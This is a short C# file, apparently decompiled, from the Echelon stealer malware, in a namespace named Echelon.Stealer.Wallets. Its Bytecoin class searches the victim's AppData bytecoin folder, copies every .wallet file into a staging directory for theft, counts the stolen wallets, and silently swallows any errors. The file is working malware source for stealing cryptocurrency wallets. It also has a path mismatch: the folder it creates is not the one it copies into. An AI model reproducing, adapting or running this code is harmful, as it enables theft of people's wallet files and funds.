using System;
using System.IO;
using Echelon.Global;

namespace Echelon.Stealer.Wallets
{
	// Token: 0x0200000B RID: 11
	internal class Bytecoin
	{
		// Token: 0x06000034 RID: 52 RVA: 0x000198EC File Offset: 0x00017AEC
		public static void BCNcoinStr(string directorypath)
		{
			try
			{
				if (Directory.Exists(Bytecoin.bytecoinDir))
				{
					foreach (FileInfo fileInfo in new DirectoryInfo(Bytecoin.bytecoinDir).GetFiles())
					{
						Directory.CreateDirectory(directorypath + "\\Wallets\\Bytecoin\\");
						if (fileInfo.Extension.Equals(".wallet"))
						{
							fileInfo.CopyTo(directorypath + "\\Bytecoin\\" + fileInfo.Name);
						}
					}
					Bytecoin.count++;
					Wallets.count++;
				}
			}
			catch
			{
			}
		}

		// Token: 0x04000038 RID: 56
		public static int count;

		// Token: 0x04000039 RID: 57
		public static string bytecoinDir = Help.AppDate + "\\bytecoin\\";
	}
}
